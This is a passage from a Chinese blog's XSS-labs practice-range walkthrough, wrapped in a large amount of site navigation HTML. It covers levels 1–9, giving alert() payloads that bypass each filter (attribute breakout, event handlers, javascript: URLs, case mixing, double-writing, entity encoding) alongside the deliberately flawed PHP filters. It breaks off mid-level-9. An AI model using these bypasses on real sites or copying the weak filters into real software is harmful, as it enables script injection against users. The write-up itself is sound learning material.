+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../ESSAY/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    随笔
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            随笔
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2405/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2405
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2404/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2404
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2403/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2403
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2402/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2402
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2401/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2401
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../TimeLine/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    时间线
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            时间线
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../TimeLine/Line/DEC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    开发 时间线
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../TimeLine/Line/WebSec/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    网络安全 时间线
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../WEBSITE/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    网站
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_6" id="__nav_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            网站
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEBSITE/build/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    网站构建说明
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEBSITE/help/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    文章编写帮助
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEBSITE/test/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    测试文档
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#level-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-1 无过滤机制
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-2 闭合标签
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-3-htmlspecialchars" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-3 单引号闭合+htmlspecialchars()
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-4" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-4 双引号闭合+添加事件
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-5-javascript" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-5 JavaScript 伪协议
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-6" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-6 大小写绕过
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-7" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-7 双写绕过
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-8" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-8 编码绕过
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-9" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-9 检测关键字
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-10 隐藏信息
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-11-referer" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-11 referer
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-12-user-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-12 user-agent
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-13-cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-13 cookie
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-14-exif" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-14 exif
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-15-ng-include" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-15 ng-include
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-16" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-16 空格实体转义
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-17" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-17 参数拼接
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-18" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-18 参数拼接
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-19-flash-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-19 flash xss
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#level-20-flash-xss" class="md-nav__link">
+    <span class="md-ellipsis">
+      level-20 flash xss
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      总结
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+    
+      
+    
+    <a href="https://github.com/AnistonH/AnistonH.github.io/raw/main/docs/WEB/labs/xss-labs靶场打靶记录.md" title="查看本页的源代码" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+  <h1>Xss labs靶场打靶记录</h1>
+
+<h2 id="level-1">level-1 无过滤机制<a class="headerlink" href="#level-1" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level1.php?name=test</p>
+</blockquote>
+<ol>
+<li>
+<p>我们先看一看页面：观察发现，URL中可以输入参数，而页面会回显参数以及参数的长度。<img alt="1" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1.jpg" /></p>
+</li>
+<li>
+<p>我们看一下页面源码，发现我们输入的内容会被直接拼接在页面中。<img alt="在这里插入图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/2.jpg" /></p>
+</li>
+<li>因此我们将URL中的中的 “test” 修改为 “<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，成功弹窗。</li>
+<li>后端代码如下（我们输入的参数在被get到的时候没有经过特殊的过滤处理）：</li>
+</ol>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><span class="cp">&lt;?php</span> 
+</span><span id="__span-0-2"><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;display_errors&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-0-3"><span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
+</span><span id="__span-0-4"><span class="k">echo</span> <span class="s2">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="o">.</span><span class="s2">&quot;&lt;/h2&gt;&quot;</span><span class="p">;</span>
+</span><span id="__span-0-5"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="level-2">level-2 闭合标签<a class="headerlink" href="#level-2" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level2.php?keyword=test</p>
+</blockquote>
+<ol>
+<li>这一关有了输入框，我们先输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>试一试，发现没有成功<img alt="在这里插入图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708019857-3.jpg" /></li>
+<li>我们在第一步的基础上进页面源码看一看：<img alt="在这里插入图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/2-1706708031890-7.jpg" /></li>
+<li>我们发现，在页面上输出的内容被转义了，但是value属性中的并没有被转移，但是问题是这里的js代码在标签属性值中，浏览器是无法执行的。因此我们想办法去闭合，我们输入<code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，进行闭合，闭合之后的为“<code>&lt;input name="keyword" value=""&gt;&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</code>”，成功弹窗。</li>
+<li>我们看一看后端代码：（用 htmlspecialchars() 对输入的字符进行了转义）
+<a href="https://www.runoob.com/php/func-string-htmlspecialchars.html">点此学习 htmlspecialchars() 函数</a></li>
+</ol>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-1-2">    <span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;display_errors&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-1-3">    <span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;keyword&quot;</span><span class="p">];</span>
+</span><span id="__span-1-4">    <span class="k">echo</span> <span class="s2">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;相关的结果.&lt;/h2&gt;&quot;</span> <span class="o">.</span> <span class="s1">&#39;&lt;center&gt;</span>
+</span><span id="__span-1-5"><span class="s1">&lt;form action=level2.php method=GET&gt;</span>
+</span><span id="__span-1-6"><span class="s1">&lt;input name=keyword  value=&quot;&#39;</span> <span class="o">.</span> <span class="nv">$str</span> <span class="o">.</span> <span class="s1">&#39;&quot;&gt;</span>
+</span><span id="__span-1-7"><span class="s1">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span>
+</span><span id="__span-1-8"><span class="s1">&lt;/form&gt;</span>
+</span><span id="__span-1-9"><span class="s1">&lt;/center&gt;&#39;</span><span class="p">;</span>
+</span><span id="__span-1-10">    <span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="level-3-htmlspecialchars">level-3 单引号闭合+htmlspecialchars()<a class="headerlink" href="#level-3-htmlspecialchars" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level3.php?writing=wait</p>
+</blockquote>
+<ol>
+<li>我们依旧是先输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，没有作用，查看网页源码，发现页面输出内容和 value 属性值都被转义了<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708053988-12.jpg" /></li>
+<li>观察发现，上图中的单引号并没有被转义，我们将单引号闭合，并使用一种不需要尖括号等的JS方法，我们输入 <code>'onclink='alert(1)</code> ，成功弹窗。
+当我们输入之后的完整代码为：<code>&lt;input name="keyword" value=' ' onclick='alert(1)'&gt;</code>
+（也可以 <code>'onclick='javascript:alert(1)</code> ）</li>
+<li>我们看一看后端源码：（确实是对两个地方都进行了转义）<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/2-1706708067440-17.jpg" /></li>
+</ol>
+<h2 id="level-4">level-4 双引号闭合+添加事件<a class="headerlink" href="#level-4" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level4.php?keyword=try harder!</p>
+</blockquote>
+<ol>
+<li>我们依旧是 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 测试，查看网页源码，发现尖括号直接就没有了<img alt="" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708075329-19.jpg" /></li>
+<li>那我们还是像上一关一样，使用不需要尖括号的写法，但是上一关是单引号闭合，而这一关是双引号，那我们就改成 <code>"onclick="alert(1)</code> 或者 <code>"onclick="javascript:alert(1)</code> ，成功弹窗。</li>
+<li>我们看一看后端代码：发现是使用 replace 对尖括号等进行了替换。</li>
+</ol>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><span class="x">$str = $_GET[&quot;keyword&quot;];</span>
+</span><span id="__span-2-2"><span class="x">$str2 = str_replace(&quot;&gt;&quot;, &quot;&quot;, $str);</span>
+</span><span id="__span-2-3"><span class="x">$str3 = str_replace(&quot;&lt;&quot;, &quot;&quot;, $str2);</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="level-5-javascript">level-5 JavaScript 伪协议<a class="headerlink" href="#level-5-javascript" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level5.php?keyword=find a way out!</p>
+</blockquote>
+<ol>
+<li>
+<p>我们还是 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> ，然后看页面源码，发现 value 属性值变成了 <code>&lt;scr_ipt&gt;alert(1)&lt;/script&gt;</code>（下划线）
+ 我们再尝试 <code>"&gt;onclick="alert(1)</code> ，查看页面源码， value 处成了 <code>value=""&gt;o_nclick="alert(1)"</code>（下划线）
+    说明后端会对 script 和 onclick 进行过滤。
+    <img alt="在这里插入图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708086843-21.jpg" /></p>
+</li>
+<li>
+<p>查资料，得知应该用 a 标签绕过，使用 JS伪协议( <code>javascript:alert(1)</code> )绕过，简单说就是把 javascript:  后面的代码当成  javascript 来执行。</p>
+</li>
+<li>因此我们输入 <code>"&gt;&lt;a href=javascript:alert(1)&gt;</code> （用 "&gt; 进行闭合），成功弹窗。</li>
+<li>看看后端代码：
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><span class="x">$str = strtolower($_GET[&quot;keyword&quot;]);</span>
+</span><span id="__span-3-2"><span class="x">$str2 = str_replace(&quot;&lt;script&quot;, &quot;&lt;scr_ipt&quot;, $str);</span>
+</span><span id="__span-3-3"><span class="x">$str3 = str_replace(&quot;on&quot;, &quot;o_n&quot;, $str2);</span>
+</span></code></pre></div></td></tr></table></div></li>
+</ol>
+<h2 id="level-6">level-6 大小写绕过<a class="headerlink" href="#level-6" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level6.php?keyword=break it out!</p>
+</blockquote>
+<ol>
+<li>（这一步和上一关一模一样）我们还是 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> ，然后看页面源码，发现 value 属性值变成了 <code>&lt;scr_ipt&gt;alert(1)&lt;/script&gt;</code>（下划线）
+ 我们再尝试 <code>"&gt;onclick="alert(1)</code> ，查看页面源码， value 处成了 <code>value=""&gt;o_nclick="alert(1)"</code>（下划线）
+    说明后端会对 script 和 onclick 进行过滤。</li>
+<li>我们像上一关一样使用 JS伪协议，发现依旧不行，居然 href 也被替换成了 hr_ef </li>
+<li>但是它并没有做大小写过滤，所以我们可以使用以下三种方法：</li>
+<li><code>"&gt;&lt;sCript&gt;alert()&lt;/sCript&gt;&lt;"</code></li>
+<li><code>"Onfocus=javascript:alert()"</code> （这种和下面那种只是少了空格而已，但是不行，至于为啥，请看第四步）</li>
+<li><code>"Onfocus=javascript:alert() "</code></li>
+<li>
+<p><code>"&gt;&lt;a hRef=javascript:alert()&gt;&lt;"</code></p>
+</li>
+<li>
+<p>我们来解决上一步中产生的问题：为什么 <code>"Onfocus=javascript:alert()"</code> 不可以，但是 <code>" Onfocus=javascript:alert() "</code>可以（二者只是差了 alert() 后面的空格而已）。请看下图：
+<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708101533-25.jpg" />
+<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/2-1706708106743-27.jpg" />
+看出区别了吧，没有空格的时候 alert() 后面的两个引号形成了闭合，而有空格的时候，则一切正常。</p>
+</li>
+<li>
+<p>我们看一看后端代码：</p>
+</li>
+</ol>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><span class="x"> $str = $_GET[&quot;keyword&quot;];</span>
+</span><span id="__span-4-2"><span class="x"> $str2 = str_replace(&quot;&lt;script&quot;, &quot;&lt;scr_ipt&quot;, $str);</span>
+</span><span id="__span-4-3"><span class="x"> $str3 = str_replace(&quot;on&quot;, &quot;o_n&quot;, $str2);</span>
+</span><span id="__span-4-4"><span class="x"> $str4 = str_replace(&quot;src&quot;, &quot;sr_c&quot;, $str3);</span>
+</span><span id="__span-4-5"><span class="x"> $str5 = str_replace(&quot;data&quot;, &quot;da_ta&quot;, $str4);</span>
+</span><span id="__span-4-6"><span class="x"> $str6 = str_replace(&quot;href&quot;, &quot;hr_ef&quot;, $str5);</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="level-7">level-7 双写绕过<a class="headerlink" href="#level-7" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level7.php?keyword=move up!</p>
+</blockquote>
+<ol>
+<li>我们依旧是尝试 <code>&lt;script&gt;alert()&lt;/script&gt;</code>，结果直接把 <code>&lt;script&gt;&lt;/script&gt;</code> 给没了，这很可能是检测到 script 标签然后进行了替换，那我们就尝试双写绕过
+<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708118234-29.jpg" /></li>
+<li>我们尝试一下内容：成功弹窗</li>
+<li><code>"&gt; &lt;a hrehreff=javasscriptcript:alert()&gt;</code></li>
+<li>
+<p><code>"&gt;&lt;scscriptript&gt;alert(1)&lt;/sscriptcript&gt;</code></p>
+</li>
+<li>
+<p>我们看一看后端代码：依旧是做了替换（问题在于只过滤了一次）
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><span class="x">$str = strtolower($_GET[&quot;keyword&quot;]);</span>
+</span><span id="__span-5-2"><span class="x">$str2 = str_replace(&quot;script&quot;, &quot;&quot;, $str);</span>
+</span><span id="__span-5-3"><span class="x">$str3 = str_replace(&quot;on&quot;, &quot;&quot;, $str2);</span>
+</span><span id="__span-5-4"><span class="x">$str4 = str_replace(&quot;src&quot;, &quot;&quot;, $str3);</span>
+</span><span id="__span-5-5"><span class="x">$str5 = str_replace(&quot;data&quot;, &quot;&quot;, $str4);</span>
+</span><span id="__span-5-6"><span class="x">$str6 = str_replace(&quot;href&quot;, &quot;&quot;, $str5);</span>
+</span></code></pre></div></td></tr></table></div></p>
+</li>
+</ol>
+<h2 id="level-8">level-8 编码绕过<a class="headerlink" href="#level-8" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level8.php?keyword=nice try!</p>
+</blockquote>
+<ol>
+<li>我们测试发现，大小写绕过 双写绕过 JS伪协议 ……各种东西都被限制了，然后我们输入内容之后点击 “友情链接” 会跳转，那我们就尝试在这里做动作。</li>
+<li>
+<p>查资料：我们能利用 href 的隐藏属性自动 Unicode 解码，我们可以插入一段 js 伪协议 <code>javascript:alert()</code>
+我们将其URL编码，得到：<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;![1](./xss-labs/8/1.jpg)&amp;#40;&amp;#41;</code>
+成功弹窗<img alt="在这里插入图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708130445-31.jpg" /></p>
+</li>
+<li>
+<p>后台源代码分析。将 keyword 提交的变量转换为小写，替换关键字 script、on、src、data、href、"，然后输出在a标签的href属性中。
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><span class="x">$str = strtolower($_GET[&quot;keyword&quot;]);</span>
+</span><span id="__span-6-2"><span class="x">$str2 = str_replace(&quot;script&quot;, &quot;scr_ipt&quot;, $str);</span>
+</span><span id="__span-6-3"><span class="x">$str3 = str_replace(&quot;on&quot;, &quot;o_n&quot;, $str2);</span>
+</span><span id="__span-6-4"><span class="x">$str4 = str_replace(&quot;src&quot;, &quot;sr_c&quot;, $str3);</span>
+</span><span id="__span-6-5"><span class="x">$str5 = str_replace(&quot;data&quot;, &quot;da_ta&quot;, $str4);</span>
+</span><span id="__span-6-6"><span class="x">$str6 = str_replace(&quot;href&quot;, &quot;hr_ef&quot;, $str5);</span>
+</span><span id="__span-6-7"><span class="x">$str7 = str_replace(&#39;&quot;&#39;, &#39;&amp;quot&#39;, $str6);</span>
+</span></code></pre></div></td></tr></table></div></p>
+</li>
+</ol>
+<h2 id="level-9">level-9 检测关键字<a class="headerlink" href="#level-9" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level9.php?keyword=not bad!</p>
+</blockquote>
+<ol>
+<li>
+<p>依旧是“友情链接”，那我们就把上一关的拿过来试一试，结果提示“您的链接不合法？有没有！”，链接合法，我们考虑一下 http 或者 https 协议，但是其实这里会有两种可能，一种是开头必须是 http 等字样，另一种是字符串中不管哪里有 http 等字样就行，看一看后端发现这一关是第二种情况，那就很舒服了（问一下  第一种情况怎么办）。<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708146065-36.jpg" /></p>
+</li>
+<li>
